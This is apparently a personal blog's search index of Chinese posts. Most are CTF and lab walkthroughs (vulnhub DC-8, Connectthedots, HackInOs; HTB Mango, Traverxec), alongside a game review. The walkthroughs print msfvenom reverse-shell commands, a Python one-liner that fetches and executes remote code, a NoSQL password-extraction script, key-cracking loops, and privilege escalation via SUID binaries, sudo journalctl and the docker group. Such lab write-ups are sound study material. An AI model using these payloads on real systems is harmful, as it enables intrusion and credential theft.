<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反序列化导致字符的逃逸</title>
      <link href="/posts/bdd52bdc/"/>
      <url>/posts/bdd52bdc/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><pre><code class="php">&lt;?phpfunction filter($string){    return preg_match(&#39;/x/&#39;,&#39;yy&#39;,$string);}$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#39;\n&#39;;$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><pre><code class="php">$username = &quot;peri0d&quot;;$payload = &#39;&quot;;i:1;s:6:&quot;123456&quot;;}&#39;;$x = str_repeat(&quot;x&quot;,20);$username = $username.$x.$payload;$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>结果</p><pre><code>&quot;a:2:{i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&quot;array(2) {  [0] =&gt;  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;  [1] =&gt;  string(6) &quot;123456&quot;}</code></pre><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文明六玩后感</title>
      <link href="/posts/61b7ba22/"/>
      <url>/posts/61b7ba22/</url>
      
        <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-DC-8</title>
      <link href="/posts/24a0544e/"/>
      <url>/posts/24a0544e/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB mango靶机实战</title>
      <link href="/posts/73230382/"/>
      <url>/posts/73230382/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Traverxec靶机实战</title>
      <link href="/posts/d5bfc2a3/"/>
      <url>/posts/d5bfc2a3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-最长回文字串</title>
      <link href="/posts/a99288c/"/>
      <url>/posts/a99288c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-Connectthedots</title>
      <link href="/posts/e4ff8385/"/>
      <url>/posts/e4ff8385/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-HackInOs</title>
      <link href="/posts/fcea4f6a/"/>
      <url>/posts/fcea4f6a/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOs-有内网"><a href="#HackInOs-有内网" class="headerlink" title="HackInOs(有内网)"></a>HackInOs(有内网)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP 192.168.99.100<br>kali IP 192.168.99.101</p><p>nmap扫描结果</p><p><img src="/posts/fcea4f6a/1576559471820.png" alt></p><p>存在上传点但是无法上传文件</p><p><img src="/posts/fcea4f6a/1576559561592.png" alt></p><p>Burp抓包发现页面源代码有注释<br><a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php" target="_blank" rel="noopener">https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</a></p><p>看到提示</p><p>看到其只使用了<code>getimagesize</code>函数进行检验<br>通过加添GIF89a可以绕过上传</p><p>而文件的名字是这么产生的<br><img src="/posts/fcea4f6a/1576560249639.png" alt></p><p>于是上传一个一句话木马，然后对目录进行爆破即可</p><pre><code># coding:utf-8import hashlibimport requestsbase_url = &quot;http://192.168.99.100:8000/uploads/&quot;target = []for i in range(101):    shell = &#39;shell.php&#39; + str(i)     shell_md5 = hashlib.md5(shell.encode(&#39;utf-8&#39;)).hexdigest()    target.append(base_url + shell_md5 + &#39;.php&#39;)for t in target:    r = requests.get(t)    if r.status_code == 200:        print(&quot;find it!&quot;)        print(t)        break</code></pre><p>之后使用蚁剑成功连接<br><img src="/posts/fcea4f6a/1576560324056.png" alt></p><p>但是发现上传不久之后shell就被删掉了</p><p>所以需要将shell移动到html目录下，(考验手速的时候到了)</p><p><img src="/posts/fcea4f6a/1576560733771.png" alt><br>此时成功得到shell，开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src="/posts/fcea4f6a/1576561228491.png" alt></p><p>使用tail命令查看<code>/etc/shadow</code></p><p>将root用户复制过来，使用john进行爆破</p><p><img src="/posts/fcea4f6a/1576561315061.png" alt></p><p>得到root账号的密码是john</p><p><img src="/posts/fcea4f6a/1576561335215.png" alt></p><p>之后切换到root用户查看flag，但是并没有结束</p><p>运行提权辅助脚本</p><p><img src="/posts/fcea4f6a/1576561435933.png" alt></p><p>注意到提权辅助脚本提示有docker<br><img src="/posts/fcea4f6a/1576561476445.png" alt></p><p>查看IP<br><img src="/posts/fcea4f6a/1576561501817.png" alt></p><p>看这个IP地址很像是docker中的地址</p><p>尝试直接用root账户及其密码john进行连接，失败</p><p>大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>反弹的shell功能还是弱了，想办法得到一个<code>meterpreter</code></p><p>这里有记录一下通过shell拿到<code>meterpreter</code>的几种办法</p><h3 id="web-delivery脚本"><a href="#web-delivery脚本" class="headerlink" title="web_delivery脚本"></a>web_delivery脚本</h3><p>使用<code>exploit/multi/script/web_delivery</code> </p><p>设置好相关参数</p><p><img src="/posts/fcea4f6a/1576562272920.png" alt></p><p>在反弹的shell中运行这段payload</p><pre><code>python -c &quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.99.101:8080/1PrsFQbkzsmuk5&#39;);exec(r.read());&quot;</code></pre><p>得到<code>meterpreter</code>之后输入<code>background</code>让其挂起</p><h3 id="使用msfenvom生成木马"><a href="#使用msfenvom生成木马" class="headerlink" title="使用msfenvom生成木马"></a>使用msfenvom生成木马</h3><p>使用<code>exploit/multi/handler</code> 这个exploit模块</p><p>加载<code>linux/x86/meterpreter_reverse_tcp</code> 这个payload，同时通过<code>msfvenom</code> 去生成一个木马</p><p><img src="/posts/fcea4f6a/1577094332538.png" alt><br><code>msfvenom</code>生成木马</p><p><code>msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell</code></p><p><img src="/posts/fcea4f6a/1577094345676.png" alt></p><p>蚁剑上传<br><img src="/posts/fcea4f6a/1577094459850.png" alt><br>执行</p><p><img src="/posts/fcea4f6a/1577094504865.png" alt></p><p>反弹得到<code>meterpreter</code></p><p><img src="/posts/fcea4f6a/1577094525517.png" alt></p><p>得到子网信息<br><img src="/posts/fcea4f6a/1577094592386.png" alt></p><p>之后通过metasploit之后添加一条路由<br><img src="/posts/fcea4f6a/1576562463870.png" alt></p><p>此时就可以看到添加的路由信息了</p><p><img src="/posts/fcea4f6a/1576581218733.png" alt></p><p>路由添加也可以通过：<code>rout add 172.18.0.0 255.255.0.0 1</code></p><p>指定了网段和子网掩码，以及对应的session<br><img src="/posts/fcea4f6a/1577094657843.png" alt></p><p>这之后我们就可以在<code>metasploit</code>中访问内网的地址了，先进行主机发现</p><p><img src="/posts/fcea4f6a/1576562503028.png" alt></p><p>发现了四台主机</p><p>进行后续的端口扫描<br><img src="/posts/fcea4f6a/1576562587710.png" alt><br>(由于扫描速度比较慢，参数调整了一下)</p><p><img src="/posts/fcea4f6a/1576581339308.png" alt></p><p>这里也尝试通过<code>proxychain</code>去进行扫描</p><h3 id="proxychain的配置"><a href="#proxychain的配置" class="headerlink" title="proxychain的配置"></a>proxychain的配置</h3><p><img src="/posts/fcea4f6a/1577095583741.png" alt></p><p>使用socks4a代理，修改<code>/etc/proxychains.conf</code>文件，</p><p><img src="/posts/fcea4f6a/1577095622289.png" alt><br> 取消注释同时在最后一行加上<code>127.0.0.1 1080</code><br>由于<code>proxyresolv</code>的位置有点问题，cp过来</p><p> <code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>之后可以通过<code>proxychains nmap -A -T4 172.18.0.2</code>启动nmap扫描，但是扫描的结果有问题</p><pre><code>root@kali:~# proxyresolv 172.18.0.3|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK172.18.0.3</code></pre><p>能够正常解析但是还是存在问题</p><p>172.18.0.2 开放了3306端口数据库，进行连接</p><p><img src="/posts/fcea4f6a/1576563049227.png" alt></p><p>此处也可以通过<code>portfwd add -l 8123 -r 172.18.0.3 -p 3306</code>端口转发到本地进行连接</p><p><code>mysql -h 127.0.0.1  -P 8123 -uwordpress -pwordpress</code><br><img src="/posts/fcea4f6a/1577094918289.png" alt></p><p>查看数据<br><img src="/posts/fcea4f6a/1576563178481.png" alt></p><p><img src="/posts/fcea4f6a/1576563190812.png" alt></p><p>解密之后得到123456<br><img src="/posts/fcea4f6a/1576563163280.png" alt></p><p>于是尝试直接使用该用户登陆主机</p><p>该用户在docker组中，可以尝试通过docker提权</p><p><img src="/posts/fcea4f6a/1576581408046.png" alt></p><p>运行的docker镜像<br><img src="/posts/fcea4f6a/1576581491492.png" alt></p><p>docker挂载即可<br><img src="/posts/fcea4f6a/1577096085570.png" alt></p><p>得到flag<br><img src="/posts/fcea4f6a/1576581453268.png" 